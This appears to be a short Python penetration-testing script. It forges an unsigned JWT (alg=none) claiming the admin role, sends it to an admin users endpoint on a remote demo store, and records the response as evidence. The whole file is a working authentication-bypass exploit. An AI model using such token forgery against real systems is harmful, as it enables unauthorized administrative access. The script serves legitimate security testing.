import jwt
import requests
import json

# Create a JWT with alg=none
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'role': 'admin', 'user': 'test'}
token = jwt.encode(payload, '', algorithm='none')
print(f"Token: {token}")

# Test against the endpoint
r = requests.get('https://duck-store.escape.tech/api/v1/admin/users', headers={'Authorization': f'Bearer {token}'}, timeout=10)
print(f"Status: {r.status_code}")
print(f"Response: {r.text[:500]}")

# Save evidence
with open('/work/evidence/jwt_none_test.json', 'w') as f:
    json.dump({
        'token': token,
        'status': r.status_code,
        'response': r.text[:2000]
    }, f)